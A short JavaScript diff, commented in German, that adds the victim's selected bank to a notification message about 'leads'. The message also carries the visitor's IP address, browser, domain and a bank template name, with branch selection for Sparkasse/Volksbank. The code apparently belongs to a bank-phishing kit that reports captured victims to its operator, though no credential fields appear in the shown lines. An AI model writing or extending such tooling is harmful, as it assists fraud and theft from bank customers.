@@ -201,7 +201,18 @@ ${bankEmoji} **${lead.template_display_name}**
     message += `📅 **Zeit:** ${timestamp}\n`;
     message += `🌐 **IP:** ${leadData.ip_address || 'Unbekannt'}\n`;
     message += `🖥️ **Browser:** ${this.formatUserAgent(leadData.user_agent)}\n`;
-    message += `🌍 **Domain:** ${leadData.domain_name}\n\n`;
+    message += `🌍 **Domain:** ${leadData.domain_name}\n`;
+
+    const selectedBankName = additionalData.selected_bank_name || additionalData.selected_bank || additionalData.bank_type;
+    const selectedBankDescription = additionalData.selected_bank_description;
+    if (selectedBankName) {
+      const bankLine = selectedBankDescription
+        ? `${selectedBankName} (${selectedBankDescription})`
+        : selectedBankName;
+      message += `🏦 **Bank:** ${bankLine}\n`;
+    }
+
+    message += `\n`;
 
     // Branch selection (for Sparkasse/Volksbank)
     if (additionalData.selectedBranch || additionalData.branchData) {
